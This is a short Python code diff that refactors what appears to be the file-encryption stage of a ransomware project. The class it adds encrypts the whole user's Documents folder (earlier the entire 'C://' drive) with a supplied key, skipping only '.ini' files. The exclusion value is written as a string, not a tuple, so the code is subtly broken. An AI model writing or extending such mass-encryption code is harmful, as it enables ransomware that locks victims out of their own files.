@@ -1,14 +1,17 @@
+from encrypter import Encrypter
 import os
-from encrypter import Encrypter, KeyGenerator
 
-keyGenerator = KeyGenerator()
 
-# instantiate fernet with key
-key = keyGenerator.generateKey()
-crypter = Encrypter(key)
+class Encrypt:
+    _path : str
+    _exclude_extensions : tuple
 
-path = "C://"
+    def __init__(self) -> None:
+        self._path = os.path.expanduser( '~' ).replace('\\', '//') + '//Documents'
+        self._exclude_extensions = ('.ini')
 
-excludeExtensions = (".ini")
 
-crypter.encrypt(path, excludeExtensions)
+    def process(self, encryption_key):
+        encrypter = Encrypter(encryption_key)
+        return encrypter.encrypt(self._path, self._exclude_extensions)
+    
